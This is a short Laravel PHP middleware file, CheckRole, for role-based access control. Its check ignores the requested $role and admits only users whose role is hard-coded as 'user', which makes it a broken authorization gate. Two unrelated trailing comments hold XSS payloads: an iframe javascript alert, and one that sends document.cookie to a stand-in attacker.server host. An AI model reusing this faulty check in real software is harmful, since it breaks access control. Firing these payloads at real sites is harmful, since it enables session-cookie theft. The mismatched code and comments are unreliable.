<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class CheckRole
{
    /**
     * Handle an incoming request.
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @param  string  $role
     */
    public function handle(Request $request, Closure $next, $role)
    {
        if (Auth::user() && Auth::user()->role === 'user') {
            return $next($request);
        }
        return response()->json(['message' => 'Unauthorized. Role '.$role.' required.'], 403);
    }
}
// /?q=<iframe src=javascript:alert(1)>
// /?q=<iframe src=javascript:window.location=%27http://attacker.server:9000/steal.php?c=%27%2Bdocument.cookie>
